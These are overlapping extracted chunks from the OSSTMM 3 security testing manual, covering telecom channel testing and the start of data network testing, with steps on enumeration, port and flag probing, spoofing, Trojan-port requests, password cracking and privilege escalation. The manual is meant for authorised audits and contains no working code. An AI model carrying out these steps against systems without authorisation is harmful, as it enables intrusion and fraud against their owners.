    "text": "lines testing (f) Voice over IP testing (g) X.25 packet switched network testing 10.2 Logistics Preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 10.2.1 Framework (a) Verify the scope and the owner(s) of the targets outlined for the audit, along with the carrier(s) and other third parties managing the telecommunication lines and infrastructure for the targets. (b) Determine the property location and the owner of the property housing the targets. (c) Search for other targets from the same owner. (d) Find and verify the paths of telecommunication services which interact outside of target for the paths they follow into and out of the scope. (e) Determine the physical location of the targets. (f) Test which protocols are used within the scope (example: PSTN, ISDN, GSM, UMTS, SIP, H.323, RTP, XOT, DECNET, IPX, etc.). (g) Verify and document the special limitations imposed by the contract with client. 10.2.2 Network Quality (a) Measure the maximum and minimum connection speeds supported by targets. (b) Determine and verify the appropriate connection speed, parity, RING time, and other specific configuration parameters to be used for scanning and testing. (c) Verify and document particular limitations imposed by the scope (example: X.25 network congestion, XOT strict routes, access filters based on CLID). Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 153\\n10.2.3 Time and Additional Costs (a) Test the time frame of equipment operation (example: call redirect to answering machine out of normal business hours). (b) Determine and document the time settings (timezone, DST, etc.) for the targets. (c) Assure the Analyst’s time clock is in sync with the time of the targets. Certain equipment like fragile artifacts may have time settings that do not represent a valid time; if the Analyst’s time clock is put in sync with these it may have an impact on the result of the test. (d) Determine the additional financial costs involved in performing thorough tests from a remote location (example: scanning for modems/FAX, testing Remote Access Services not on toll-free numbers, placing X.25 calls without reverse charge). 10.3 Active Detection Verification Determination of active controls to detect intrusion and to filter or deny test attempts must be made prior to testing to mitigate the risk of corrupting the test result data as well as changing the alarm status of monitoring personnel or agents. It may be necessary to coordinate these tests with the appropriate personnel within the scope. 10.3.1 Monitoring (a) Test whether telecommunications are monitored by an authoritative party for relaying improper network data, code injections, malicious content and improper conduct, and record responses and response time. (b) Test whether controls are in place for monitoring fraudulent activities or services tampering, and record responses and response time such as in periodic billing reconciliation using Call Detail Records (CDR). 10.3.2 Filtering (a) Test whether network-level controls are in place for blocking unauthorized activities and record responses and response time such as access filters based on Call Line Identification (CLID),",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 108
    }
  },
  {
    "text": "or services tampering, and record responses and response time such as in periodic billing reconciliation using Call Detail Records (CDR). 10.3.2 Filtering (a) Test whether network-level controls are in place for blocking unauthorized activities and record responses and response time such as access filters based on Call Line Identification (CLID), Network User Address (NUA), or Closed User Group (CUG). (b) Test whether application-level controls are in place for blocking unauthorized activities and record responses and response time. 10.3.3 Active Detection (a) Verify active responses to probes from systems and services. (b) Verify if protection from brute force attacks such as account locking are in place. (c) Map any applications, systems, or network segments within the scope which produce logs, alarms, or notifications. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 154\\n10.4 Visibility Audit Enumeration and indexing of the targets in the scope through direct and indirect interaction with or between live systems. 10.4.1 Network Surveying (a) Compile a map of communication protocols in use within the scope. (b) Outline the topology of the telecommunication networks within the scope. 10.4.2 Enumeration (a) PBX testing: enumerate telephony systems within the scope. (b) Voice mailbox testing: find voice mailboxes within the scope. (c) FAX testing: enumerate FAX systems within the scope. (d) Modem survey: find all systems with listening and interactive modems within the scope. (e) Remote Access Services testing: enumerate RAS systems within the scope. (f) Backup ISDN lines testing: enumerate network devices with backup ISDN lines within the scope. (g) Voice over IP testing: enumerate VoIP systems within the scope. (h) X.25 packet switched network testing: find live and reachable systems within the scope, recording their response codes. 10.4.3 Identification (a) Identify OS types and versions in use on systems within the scope. (b) Identify service types and versions in use on systems within the scope. (c) Identify modem and FAX types and operating programs. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 155\\n10.5 Access Verification Tests for the measurement of the breadth and depth of interactive access points leading within the scope and required authentication. 10.5.1 Access Process (a) PBX testing: find PBX systems that are allowing remote administration or world access to the maintenance terminal, either via telephone dial-in or IP network. (b) Voice mailbox testing: find voice mailboxes that are world accessible. (c) FAX testing: find FAX systems that are allowing remote administration or world access to the maintenance terminal. (d) Modem survey: test and document the authentication protocols in use (example: terminal, PAP, CHAP, others). (e) Remote Access Services testing: test and document the authentication protocols in use (example: terminal, PAP, CHAP, others). (f) Backup ISDN lines testing: test and document the authentication protocols in use (example: terminal, PAP, CHAP, others). (g) Voice over IP testing: verify the possibility of performing toll fraud, call eavesdropping or tracing, call hijacking, CLID spoofing, and Denial of Service, using attacks targeting converging networks, VoIP network elements, signaling and media transport protocols. (h) X.25 packet switched network testing: find systems that",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 109
    }
  },
  {
    "text": "terminal, PAP, CHAP, others). (g) Voice over IP testing: verify the possibility of performing toll fraud, call eavesdropping or tracing, call hijacking, CLID spoofing, and Denial of Service, using attacks targeting converging networks, VoIP network elements, signaling and media transport protocols. (h) X.25 packet switched network testing: find systems that are allowing remote administration, access to other services via specific CUDs, or reverse charge, verify how many Virtual Channels (VCs) and Permanent Virtual Channels (PVCs) are in use and how they are managed (CUG, sub-addresses mapping, incoming X.25 calls screening, filtering based on NUA, etc.). 10.5.2 Services (a) Request known, common remote services. (b) Identify the components of services and their versions. (c) Verify service uptime to latest vulnerabilities and patch releases. (d) For each identified service, remotely test, and document configuration errors. (e) For each identified application, remotely test, and document programming errors. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 156\\n10.5.3 Authentication (a) Enumerate telecommunication resources requiring authentication and verify all acceptable forms of privileges to interact or receive access. (b) Document the authentication schemes in use, verify the process for receiving authentication, and test for logic errors. (c) Verify the methods of authorization and the identification required. (d) Ensure administrative accounts do not have default or easily guessed credentials. (e) Ensure user accounts do not have default or easily guessed credentials. (f) Verify and test protections against brute force and dictionary type attacks. (g) Verify and test password complexity checks and voice mailbox PIN size, password aging, and frequency of change controls. (h) Try “known” credentials on all enumerated access points, to verify password re-usage controls. (i) Verify the format used for storage of authentication credentials and document clear-text or obfuscated passwords and weak encryption algorithms. (j) Verify the format used for transmission of authentication credentials through the network and document clear-text or obfuscated passwords and weak encryption algorithms. (k) Verify that authentication information whether attempted, successful, or failed. is appropriately logged. 10.6 Trust Verification Tests for trusts between systems within the scope, where trust refers to access to information or physical property without the need for authentication credentials. 10.6.1 Spoofing (a) Test and document the access methods in use that do not require submission of authentication credentials. (b) Test and document the depth of requirements for interaction with and access to property within the scope by means of spoofing a trusted source (example: CLID and X.25 NUA spoofing). 10.6.2 Resource Abuse (a) Test and document the depth of requirements to take property outside of the scope to a known and trusted source or throughout the scope itself without any established, required credentials. (b) Test and document the property available from outside of the scope due to information leaks. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 157\\n10.7 Controls Verification Tests to enumerate and verify the operational functionality of safety measures for assets and services, defined by means of process-based (Class B) loss controls. The control of alarm is verified at the end of the methodology. 10.7.1",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 110
    }
  },
  {
    "text": "information leaks. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 157\\n10.7 Controls Verification Tests to enumerate and verify the operational functionality of safety measures for assets and services, defined by means of process-based (Class B) loss controls. The control of alarm is verified at the end of the methodology. 10.7.1 Non-repudiation (a) Enumerate and test for use or inadequacies from applications and systems to properly identify and log access or interactions to property for specific evidence to challenge repudiation. (b) Document the depth of the recorded interaction and the process of identification. (c) Verify that all methods of interaction are properly recorded with proper identification. (d) Identify methods of identification which defeat repudiation. 10.7.2 Confidentiality (a) Enumerate all interactions with services within the scope for communications or assets transported over the channel using secured lines, encryption, “quieted” or “closed” interactions to protect the confidentiality of the information property between the involved parties. (b) Verify the acceptable methods used for confidentiality. (c) Test the strength and design of the encryption or obfuscation methods. (d) Verify the outer limits of communication which can be protected via the applied method of confidentiality. 10.7.3 Privacy Enumerate all interactions with services within the scope for communications or assets transported over the channel using secured lines, encryption, “quieted” or “closed” interactions to protect the privacy of the interaction and the process of providing assets only to those within the proper security clearance for that process, communication, or asset. 10.7.4 Integrity Enumerate and test for inadequacies of integrity where using a documented process, signatures, encryption, hash, or markings to assure that the asset cannot be changed, switched, redirected, or reversed without it being known to parties involved. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 158\\n10.8 Process Verification Tests to examine the maintenance of functional security and effectiveness in established processes and due diligence as defined in the Posture Review. 10.8.1 Baseline Examine and document the baseline services to ensure the processes are in line with the security policy. 10.8.2 Maintenance Examine and document the timeliness, appropriateness, access to, and extent of processes for the notification and security awareness of personnel in regards to operational security, actual security, and loss controls. 10.8.3 Misinformation Determine the extent to which personnel security notifications and security news can be expanded or altered with misinformation. 10.8.4 Due Diligence Map and verify any gaps between practice and requirements as determined in the Posture Review through all channels. 10.8.5 Indemnification (a) Document and enumerate targets and services which are protected from abuse or circumvention of employee policy, are insured for theft or damages, or use liability and permission disclaimers. (b) Verify the legality and appropriateness of the language in the disclaimers. (c) Verify the effect of the disclaimers upon security or safety measures. (d) Examine the language of the insurance policy for limitations on types of damages or assets. (e) Compare cultural access policy with indemnification policy for evidence of weaknesses. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 159\\n10.9 Configuration Verification Tests",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 111
    }
  },
  {
    "text": "the effect of the disclaimers upon security or safety measures. (d) Examine the language of the insurance policy for limitations on types of damages or assets. (e) Compare cultural access policy with indemnification policy for evidence of weaknesses. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 159\\n10.9 Configuration Verification Tests to gather all information, technical and non-technical, on how assets are intended to work, and to examine the ability to circumvent or disrupt functional security in assets, exploiting improper configuration of access controls, loss controls, and applications. 10.9.1 Configuration Controls (a) Examine controls, including baseline configuration, to validate proper configurations of equipment, systems, and applications within the scope. (b) Examine controls to ensure configurations of equipment, systems, and applications match the intent of the organization and reflect a business justification. (c) Examine Access Control Lists (ACLs) configured on networks, systems, services, and applications within the scope, to ensure they match the intent of the organization and reflect a business justification. 10.9.2 Common Configuration Errors (a) PBX testing: check for unnecessary, insecure or unused services/features and default credentials, verify the patch level of PBX systems to identify known vulnerabilities. (b) Voice mailbox testing: check for unnecessary, insecure or unused services/features and default credentials, verify the patch level of voice mailbox systems to identify known vulnerabilities. (c) FAX testing: check for unnecessary, insecure or unused services/features and default credentials, verify the patch level of FAX systems to identify known vulnerabilities. (d) Modem survey: check for unnecessary or unused answering modems within the scope. (e) Remote Access Services testing: check for unnecessary, insecure or unused services/features and default credentials, verify the patch level of RAS servers to identify known vulnerabilities. (f) Backup ISDN lines testing: check for unnecessary, insecure or unused services and default credentials, verify the patch level of network equipment to identify known vulnerabilities. (g) Voice over IP testing: check for unnecessary, insecure or unused services/protocols and default credentials on all systems within the VoIP infrastructure, and verify their patch level to identify known vulnerabilities. (h) On X.25 packet switched network testing check for unnecessary, insecure or unused services and default credentials on all X.25 systems, and verify their patch level to identify known vulnerabilities. 10.9.3 Source Code Audit Examine the available source code of applications where available to validate controls balance operations. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 160\\n10.10 Property Validation Tests to examine information and physical property available within the scope or provided by personnel which may be illegal or unethical. 10.10.1Sharing Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is shared between personnel either intentionally through sharing processes and programs, libraries, and personal caches or unintentionally through mismanagement of licenses and resources, or negligence. 10.10.2Black Market Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is promoted, marketed, or sold between personnel or by the organization. 10.10.3Sales Channels Verify public, out of scope businesses, auctions, or property sales which provide contact information through channels originating",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 112
    }
  },
  {
    "text": "and resources, or negligence. 10.10.2Black Market Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is promoted, marketed, or sold between personnel or by the organization. 10.10.3Sales Channels Verify public, out of scope businesses, auctions, or property sales which provide contact information through channels originating within the scope. 10.10.4Rogue Modems Perform a complete inventory of all modems within the scope. Verify that the organization has adopted an adequate security policy that addresses the use and provision of modems. 10.11 Segregation Review Tests for appropriate separation of private or personal information from business information. Like a privacy review, it is the focal point of the legal and ethical storage, transmission, and control of personnel, partner, and customer private information . 10.11.1Privacy Containment Mapping Map gatekeepers of private information within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated. 10.11.2Disclosure Examine and document types of disclosures of private information in communication services from gatekeepers responsible for this segregation according to policy and regulations as determined in the Posture Review and the basic human right to. 10.11.3Limitations Examine and document types of gateways and channel alternatives with gateways accessible to people with physical limitations within that channel such as in the TTY service. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 161\\n10.12 Exposure Verification Tests for uncovering public information which describes indirect visibility of targets within the scope or provides for or leads to authenticated access. 10.12.1Exposure Mapping (a) Identify personal and business information such as personal and work phone numbers, mobile phone numbers, toll-free phone numbers, FAX numbers, owners of the telecommunication lines, carriers, and organizational affiliations, using all available means such as company websites, phone books, on-line directory information, and telecommunication subscriber’s databases. (b) Identify other telecommunication lines such as X.25, using both company websites and search engines. (c) Identify personal and business information such as organization charts, key personnel titles, job descriptions, private and public e-mail addresses, log-ins (example: X.25 PSI mail information leak), log-in schemes, passwords, back-up methods, insurers, or any particular organizational information stated implicitly as confidential in regulations and policy. 10.12.2Profiling Profile and verify the organization, its public telecommunication networks, employees, technologies, and business direction. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 162\\n10.13 Competitive Intelligence Scouting Tests for scavenging property that can be analyzed as business intelligence. While competitive intelligence as a field is related to marketing, the process here includes any form of competitive intelligence gathering, including but not limited to economic and industrial espionage. 10.13.1Business Grinding (a) Map gatekeepers of business property within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated. (b) Measure the cost of telecommunication infrastructure based on equipment (example: phones, PBX, modems, FAX, etc.). (c) Measure the cost of the support infrastructure, based on carrier and maintenance costs, including technical personnel. (d) Verify what kind of business is managed through the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 113
    }
  },
  {
    "text": "over which channels the information is communicated. (b) Measure the cost of telecommunication infrastructure based on equipment (example: phones, PBX, modems, FAX, etc.). (c) Measure the cost of the support infrastructure, based on carrier and maintenance costs, including technical personnel. (d) Verify what kind of business is managed through the telecommunication infrastructure (example: call center, customer care, help desk, etc.). (e) Verify the amount of traffic in a defined time range. 10.13.2Business Environment (a) Explore and document business details such as alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, planning, stocks and trading, and any particular business information or property stated implicitly as confidential in regulations and policy. (b) Identify telecommunication lines which are part of the business of partners. 10.13.3Organizational Environment Examine and document types of disclosures of business property from gatekeepers on operations, processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational property stated implicitly as confidential in regulations and policy. 10.14 Quarantine Verification Tests for verifying the proper fielding and containment of aggressive or hostile contacts at the gateway points. 10.14.1Containment Process Identification Identify and examine quarantine methods and processes at the target in all channels for annoying, aggressive, or hostile contacts such as telemarketers, head hunters, and stalkers. 10.14.2Containment Levels Verify the state of containment, length of time, and all channels where interactions have quarantine methods. Ensure that methods are within legal context and boundaries. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 163\\n10.15 Privileges Audit Tests where credentials are supplied to the user and permission is granted for testing with those credentials. 10.15.1Identification Examine and document the process for obtaining identification through both legitimate and fraudulent means on all channels. 10.15.2Authorization (a) Verify the use of fraudulent authorization on all channels to gain privileges similar to that of other personnel. (b) Test and document possible paths for bypassing Access Control Lists (ACLs) configured for networks, systems, services, and applications within the scope. 10.15.3Escalation Verify and map access to information through the use of privileges to gain higher privileges. 10.15.4Subjugation Enumerate and test for inadequacies from all channels to use or enable loss controls not enabled by default. 10.16 Survivability Validation Determining and measuring the resilience of the target within the scope to excessive or hostile changes designed to cause service failure. 10.16.1Continuity (a) Enumerate and test for inadequacies from target with regard to access delays and service response time through back-up personnel or automated means for alternate access. (b) Enumerate and test for inadequacies from target with regard to Quality of Service issues and performance requirements of telecommunication technologies. 10.16.2Resilience Map and document the process of gatekeepers disconnecting channels due to breach or safety concerns as a gap analysis with regulation and security policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 164\\n10.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 114
    }
  },
  {
    "text": "Map and document the process of gatekeepers disconnecting channels due to breach or safety concerns as a gap analysis with regulation and security policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 164\\n10.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions, both human and mechanical. 10.17.1Alarm (a) Verify and enumerate the use of a localized or scope-wide warning system, log, or message for each access gateway over each channel where a suspect situation is elevated upon suspicion of intrusion attempts or fraudulent activity and determine clipping levels. (b) Review outgoing and incoming call detail logs for signs of abuse or fraud. (c) Test and document log management systems. 10.17.2Storage and Retrieval (a) Document and verify the unprivileged access to alarm, log, and notification storage locations and property. (b) Test and document logging backup policy and logging to multiple locations, to ensure that audit trails cannot be tampered with. (c) Test and document log management systems. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 165\\nThe 3 rules of data security tools are: 1. tools don’t know when they lie, 2. tools are only as smart as their designers, and 3. tools can only work properly within the confines of the environment they were made for. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 166\\nChapter 11 - Data Networks Security Testing The tests for the Data Networks Security (COMSEC) channel require interactions with the existing data communication network operational safeguards used to control access to property. This channel covers the involvement of computer systems, primarily the operating networks within the target scope or framework. While some organizations consider this simply as “penetration testing”, the true compliance objective of security testing in this channel is system interaction and operational quality testing with gap measurements to the required security standard outlined in company policy, industry regulations, or regional legislation. During testing, end operators and artificial intelligence can recognize on-going attacks both by process and signature. For this reason, the Analyst will be required to have a sufficient variety of methods to avoid disclosure of the tests or work with the operators to assure that where security fails and where it succeeds is brought to light. Tests which focus only on the discovery of new problems only leave room for fixes and not designs for future improvements. Competent Analysts will require adequate networking knowledge, diligent security testing skills, and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. Ignorantia legis neminem excusat: Analysts who do not do proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, persons have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore,",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 115
    }
  },
  {
    "text": "proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, persons have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore, the assumption exists that what may not be common knowledge for a normal person about a foreign region’s laws regarding computer systems, professionals make themselves aware of the laws necessary to engage in that undertaking. 2. Property rights: Testing must specifically target only systems which are under direct legal ownership with the scope owner and computer systems on the property of the scope owner. Any personal effect should remain personal and private unless it specifically involves the scope owner through disparagement, false light, competitiveness, or reasons stated in personnel contract agreements. Analysts must make efforts to not invade upon a person’s private life where that private life has made efforts to separate itself from the scope. Analysts with special agreements to test systems which are under direct contract but not owned or are owned but not housed at the owner’s legal property must take great caution to assure tests have minimum impact on other systems and tertiary parties outside the scope or contract. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 167\\n11.1 Posture Review Initial studies of the posture include the laws, ethics, policies, industry regulations, and political culture which influence the security and privacy requirements for the scope. This review forms a matrix against which testing should be mapped but not constrained due to the ubiquity of the channel endpoints. Therefore, it is important to consider, as some legislation requires, the target market or end users of this channel which must also be added to the scope for this module. 11.1.1 Policy Review and document appropriate organizational policy regarding security, integrity, and privacy requirements of the scope. Review and document contracts and Service Level Agreements (SLAs) with service providers and other involved third parties. 11.1.2 Legislation and Regulations Review and document appropriate regional and national legislation, and industry regulations regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. 11.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, help desk use, and requirements for reporting security issues. 11.1.4 Age Review and document the age of systems, software, and service applications required for operations. 11.1.5 Fragile Artifacts Review and document any systems, software, and service applications which require special care due to high use, instabilities, or a high rate of change. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 168\\n11.2 Logistics This is the preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 11.2.1 Framework (a) Verify the scope and the owner of the targets outlined",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 116
    }
  },
  {
    "text": "high rate of change. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 168\\n11.2 Logistics This is the preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 11.2.1 Framework (a) Verify the scope and the owner of the targets outlined for the audit. (b) Determine the property location and the owner of the property housing the targets. (c) Verify the owner of the targets from network registration information. (d) Verify the owner of the target domains from domain registration information. (e) Verify the ISP(s) providing network access or redundancy. (f) Search for other IP blocks and targets related to the same owner(s). (g) Search for similar domain names or mistyped domain names which can be confused with the target. (h) Verify which target domain names resolve to systems outside of the owner’s control such as caching devices. (i) Verify which target IP addresses trace back to locations different from the owner’s location. (j) Verify that reverse name look-ups of target system addresses correspond with the scope and the scope owner. (k) Find and verify the paths of network services which interact outside of target for the paths they follow into and out of the scope. (l) Prepare local name resolution to map domain names only to the specific systems to be tested and not any devices outside the target or target ownership. (m)Use reverse name look-ups as an additional information source towards determining the existence of all the machines in a network. 11.2.2 Network Quality (a) Measure the rate of speed and packet loss to the scope for a requested service in TCP, UDP, and ICMP both as a whole service request and as a request/response pair. Repeat each request in succession at least 100 times and record the average for both whole service requests and packet responses for each of the three protocols. (b) Determine sending and receiving packet rates for a total of 6 averages (per protocol) as requests per second per network segment in the scope. (c) Record packet loss percentages for the determined packet sending and receiving rates. 11.2.3 Time (a) Verify timezone, holidays, and work schedules for the various systems within the scope including partners, resellers, and influential customers interacting with the scope. (b) Identify the Time To Live (TTL) distance to the gateway and the targets. (c) Assure the Analyst’s clock is in sync with the time of the targets. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 169\\n11.3 Active Detection Verification Determination of active and passive controls to detect intrusion to filter or deny test attempts must be made prior to testing to mitigate the risk of corrupting the test result data as well as changing the alarm status of monitoring personnel or agents. It may be necessary to coordinate these tests with the appropriate persons within the scope. 11.3.1 Filtering (a) Test whether INCOMING network data or communications over web, instant messaging, chat, web-based forums, or e-mail, are monitored or filtered by",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 117
    }
  },
  {
    "text": "well as changing the alarm status of monitoring personnel or agents. It may be necessary to coordinate these tests with the appropriate persons within the scope. 11.3.1 Filtering (a) Test whether INCOMING network data or communications over web, instant messaging, chat, web-based forums, or e-mail, are monitored or filtered by an authoritative party for relay of improper materials, code injections, malicious content, and improper conduct and record responses and response time. (b) Test whether OUTGOING network data or communications over web, instant messaging, chat, web-based forums, or e-mail, are monitored or filtered by an authoritative party for relay of improper materials, code injections, malicious content, and improper conduct and record responses and response time. 11.3.2 Active Detection (a) Verify active responses to probes from systems and services. This could be human or machine readable notifications, packet responses, silent alarm trips, or the like. (b) Map any applications, systems, or network segments within the scope which produce logs, alarms, or notifications. This could include Network or Host based Intrusion Detection or Prevention Systems, syslog, Security Information Management tools (SIMs), application logs, and the like. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 170\\n11.4 Visibility Audit Enumeration and indexing of the targets in the scope through direct and indirect interaction with or between live systems. 11.4.1 Network Surveying (a) Identify the perimeter of the target network segment(s) and the vector from which they will be tested. (b) Use network sniffing to identify emanating protocols from network service responses or requests where applicable. For example, Netbios, ARP, SAP, NFS, BGP, OSPF, MPLS, RIPv2, etc. (c) Query all name servers and the name servers of the ISP or hosting provider, if available, for corresponding A, AAAA, and PTR records as well as ability to perform zone transfers to determine the existence of all targets in the network and any related redundancies, load balancing, caching, proxying, and virtual hosting. (d) Verify broadcast requests and responses from all targets. (e) Verify and examine the use of traffic and routing protocols for all targets. (f) Verify ICMP responses for ICMP types 0-255 and ICMP codes 0-2 from all targets. (g) Verify default and likely SNMP community names in use are according to practical deployments of all SNMP versions. (h) Verify responses from targets to select ports with TTL expiration set to less than 1 and 2 hops from the targets. For example: TCP 8, 22, 23, 25, 80, 443, 445, 1433 UDP 0, 53, 139, 161 ICMP T00:C00, T13:C00, T15:C00, T17:C00 (i) Trace the route of ICMP packets to all targets. (j) Trace the route of TCP packets to all targets for ports SSH, SMTP, HTTP, and HTTPS ports. (k) Trace the route of UDP packets to all targets for DNS and SNMP ports. (l) Identify TCP ISN sequence number predictability for all targets. (m)Verify IPID increments from responses for all targets. (n) Verify the use of Loose Source Routing to the target gateway and outer perimeter systems to route packets to all targets. Creative Commons 3.0",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 118
    }
  },
  {
    "text": "all targets for DNS and SNMP ports. (l) Identify TCP ISN sequence number predictability for all targets. (m)Verify IPID increments from responses for all targets. (n) Verify the use of Loose Source Routing to the target gateway and outer perimeter systems to route packets to all targets. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 171\\n11.4.2 Enumeration (a) Search newsgroups, forums, IRC, IM, P2P, VoIP, and web-based communications for connecting information of the target to determine outgoing gateway systems and internal addressing. (b) Examine e-mail headers, bounced mails, read receipts, mail failures, and malware rejections to determine outgoing gateway systems and internal addressing. (c) Examine target web-based application source code and scripts to determine the existence of additional targets in the network. (d) Examine service and application emanations. Manipulate and replay captured traffic to invoke new requests or responses, gain depth, or expose additional information. For example, SQL, Citrix, HTTP, SAP, DNS, ARP, etc. (e) Search web logs and intrusion logs for system trails from the target network. (f) Verify all responses from UDP packet requests to ports 0-65535. (g) Verify responses to UDP packet requests FROM SOURCE ports 0, 53, 139, and 161 to 0, 53, 69, 131, and 161. (h) Verify responses to UDP packet requests with BAD CHECKSUMS to all discovered ports and for 0, 53, 69, 131, and 161. (i) Verify service request responses to common and contemporary UDP remote access malware ports. (j) Verify responses from TCP SYN packet requests to ports 0-65535. (k) Verify responses from TCP service requests to ports 0, 21, 22, 23, 25, 53, 80, and 443. (l) Verify responses from a TCP ACK with a SOURCE port of 80 to ports 3100-3150, 10001-10050, 33500-33550, and 50 random ports above 35000. (m)Verify responses from TCP SYN fragments to ports 0, 21, 22, 23, 25, 53, 80, and 443. (n) Verify responses from all combinations of TCP flags to ports 0, 21, 22, 23, 25, 53, 80, and 443. (o) Verify the use of all targets with HTTP or HTTPS based VPNs, proxies, and URL redirectors to redirect requests for targets within the scope. (p) Verify the use of all targets with sequential IPIDs to enumerate systems within the network. (q) Map and verify for consistency visible systems and responding ports by TTLs. 11.4.3 Identification Identify targets’ TTL response, system uptime, services, applications, application faults, and correlate this with the responses from system and service fingerprinting tools. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 172\\n11.5 Access Verification Tests for the enumeration of access points leading within the scope. 11.5.1 Network (a) Request known, common services which utilize UDP for connections from all addresses. (b) Request known, common VPN services including those which utilize IPSEC and IKE for connections from all addresses. (c) Manipulate network service and routing to access past restrictions within the scope. (d) Request known, common Trojan services which utilize UDP for connections from all addresses. (e) Request known, common Trojan services which utilize ICMP for connections from all",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 119
    }
  },
  {
    "text": "which utilize IPSEC and IKE for connections from all addresses. (c) Manipulate network service and routing to access past restrictions within the scope. (d) Request known, common Trojan services which utilize UDP for connections from all addresses. (e) Request known, common Trojan services which utilize ICMP for connections from all addresses. (f) Request known, common Trojan services which utilize TCP for connections from all addresses and unfiltered ports which have sent no response to a TCP SYN. 11.5.2 Services (a) Request all service banners (flags) for discovered TCP ports. (b) Verify service banners (flags) through interactions with the service comprising of both valid and invalid requests. (c) Match each open port to a daemon (service), application (specific code or product which uses the service), and protocol (the means for interacting with that service or application). (d) Verify system uptime compared to the latest vulnerabilities and patch releases. (e) Verify the application to the system and the version. (f) Identify the components of the listening service. (g) Verify service uptime compared to the latest vulnerabilities and patch releases. (h) Verify service and application against TTL and OS fingerprint results for all addresses. (i) Verify HTTP and HTTPS for virtual hosting. (j) Verify VoIP services. (k) Manipulate application and service requests outside of standard boundaries to include special characters or special terminology of that service or application to gain access. 11.5.3 Authentication (a) Enumerate accesses requiring authentication and document all privileges discovered which can be used to provide access. (b) Verify the method of obtaining the proper Authorization for the authentication. (c) Verify the method of being properly Identified for being provided the authentication. (d) Verify the logic method of authentication. (e) Verify the strength of the authentication through password cracking and re-applying discovered passwords to all access points requiring authentication. (f) Verify the process for receiving authentication. (g) Test for logic errors in the application of the authentication. Creative Commons 3.0 